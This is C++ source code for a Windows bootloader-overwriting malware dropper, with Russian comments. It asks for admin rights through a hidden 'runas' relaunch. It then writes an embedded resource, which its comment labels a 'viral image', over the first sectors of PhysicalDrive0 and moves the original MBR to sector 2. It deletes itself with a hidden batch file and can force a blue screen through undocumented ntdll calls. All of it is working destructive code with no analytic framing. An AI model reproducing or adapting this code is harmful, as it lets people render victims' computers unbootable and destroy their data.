#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

// ============================================================
// МАРКЕР ДЛЯ ПАТЧА (НЕ УДАЛЯТЬ!)
// ============================================================
const char MARKER_MBR[] = "MBR";

// ============================================================
// ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА
// ============================================================
bool IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&ntAuthority, 2, 
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    
    return isAdmin == TRUE;
}

// ============================================================
// ВКЛЮЧЕНИЕ ПРИВИЛЕГИИ ДЛЯ BSOD
// ============================================================
void EnableShutdownPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return;
    
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValueA(NULL, "SeShutdownPrivilege", &luid))
        return;
    
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
}

// ============================================================
// ВЫЗОВ BSOD (ГАРАНТИРОВАННЫЙ)
// ============================================================
void TriggerBSOD() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    
    typedef NTSTATUS (NTAPI *NtRaiseHardError_t)(
        NTSTATUS ErrorStatus,
        ULONG NumberOfParameters,
        ULONG UnicodeStringParameterMask,
        PULONG_PTR Parameters,
        ULONG ResponseOption,
        PULONG Response
    );
    
    NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
    if (NtRaiseHardError) {
        EnableShutdownPrivilege();
        ULONG_PTR params[4] = {0};
        ULONG response = 0;
        
        NtRaiseHardError(
            0xC000021A,
            1,
            0,
            params,
            6,
            &response
        );
    }
    
    typedef NTSTATUS (NTAPI *NtSetSystemInformation_t)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength
    );
    
    NtSetSystemInformation_t NtSetSystemInformation = 
        (NtSetSystemInformation_t)GetProcAddress(ntdll, "NtSetSystemInformation");
    
    if (NtSetSystemInformation) {
        ULONG bugCheckCode = 0xDEADDEAD;
        NtSetSystemInformation(0x57, &bugCheckCode, sizeof(bugCheckCode));
    }
    
    HMODULE win32u = LoadLibraryA("win32u.dll");
    if (win32u) {
        typedef NTSTATUS (NTAPI *NtUserCallOneParam_t)(ULONG_PTR, ULONG);
        NtUserCallOneParam_t NtUserCallOneParam = 
            (NtUserCallOneParam_t)GetProcAddress(win32u, "NtUserCallOneParam");
        if (NtUserCallOneParam) {
            NtUserCallOneParam(0, 0x86);
        }
        FreeLibrary(win32u);
    }
    
    HMODULE ntdll2 = GetModuleHandleA("ntdll.dll");
    if (ntdll2) {
        typedef NTSTATUS (NTAPI *RtlAdjustPrivilege_t)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
        RtlAdjustPrivilege_t RtlAdjustPrivilege = 
            (RtlAdjustPrivilege_t)GetProcAddress(ntdll2, "RtlAdjustPrivilege");
        
        typedef NTSTATUS (NTAPI *NtShutdownSystem_t)(ULONG);
        NtShutdownSystem_t NtShutdownSystem = 
            (NtShutdownSystem_t)GetProcAddress(ntdll2, "NtShutdownSystem");
        
        if (RtlAdjustPrivilege && NtShutdownSystem) {
            BOOLEAN enabled = FALSE;
            RtlAdjustPrivilege(19, TRUE, FALSE, &enabled);
            NtShutdownSystem(1);
        }
    }
}

// ============================================================
// ПОВЫШЕНИЕ ПРАВ
// ============================================================
void ElevateAndRun() {
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    
    LPSTR lpCmdLine = GetCommandLineA();
    
    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "runas";
    sei.lpFile = szPath;
    sei.lpParameters = lpCmdLine;
    sei.nShow = SW_HIDE;
    
    if (ShellExecuteExA(&sei)) {
        ExitProcess(0);
    }
}

// ============================================================
// ЗАПИСЬ MBR (ИЗ РЕСУРСА)
// ============================================================
void WriteMBR() {
    HRSRC hRes = FindResourceA(NULL, "MBR", "BINARY");
    if (!hRes) return;
    
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;
    
    DWORD size = SizeofResource(NULL, hRes);
    unsigned char* image = (unsigned char*)LockResource(hData);
    if (!image || size < 512) return;
    
    HANDLE hDisk = CreateFileA(
        "\\\\.\\PhysicalDrive0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
        NULL
    );
    
    if (hDisk == INVALID_HANDLE_VALUE) {
        hDisk = CreateFileA(
            "\\\\.\\PhysicalDrive0",
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            0,
            NULL
        );
        if (hDisk == INVALID_HANDLE_VALUE) return;
    }
    
    // ============================================================
    // ШАГ 1: ЧИТАЕМ ОРИГИНАЛЬНЫЙ MBR
    // ============================================================
    unsigned char originalMBR[512];
    DWORD bytesRead = 0;
    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
    if (!ReadFile(hDisk, originalMBR, 512, &bytesRead, NULL) || bytesRead != 512) {
        CloseHandle(hDisk);
        return;
    }
    
    // ============================================================
    // ШАГ 2: ЗАПИСЫВАЕМ ВИРУСНЫЙ ОБРАЗ (13 СЕКТОРОВ) В СЕКТОР 0
    // ============================================================
    DWORD bytesWritten = 0;
    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
    WriteFile(hDisk, image, size, &bytesWritten, NULL);
    
    // ============================================================
    // ШАГ 3: СОХРАНЯЕМ ОРИГИНАЛЬНЫЙ MBR В СЕКТОР 2 (БЭКАП)
    // ============================================================
    SetFilePointer(hDisk, 512 * 2, NULL, FILE_BEGIN);
    WriteFile(hDisk, originalMBR, 512, &bytesWritten, NULL);
    
    CloseHandle(hDisk);
    
    // --- Самоуничтожение ---
    char szPath[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    
    std::string batPath = std::string(szPath) + ".bat";
    std::ofstream bat(batPath.c_str());
    bat << "@echo off\n";
    bat << "ping 127.0.0.1 -n 2 > nul\n";
    bat << "del \"" << szPath << "\"\n";
    bat << "del \"" << batPath << "\"\n";
    bat.close();
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(NULL, (LPSTR)batPath.c_str(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    if (FindResourceA(NULL, "BSOD", RT_RCDATA)) {
        TriggerBSOD();
    }
}

// ============================================================
// ТОЧКА ВХОДА
// ============================================================
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    if (!IsAdmin()) {
        ElevateAndRun();
        return 0;
    }
    
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    WriteMBR();
    
    return 0;
}
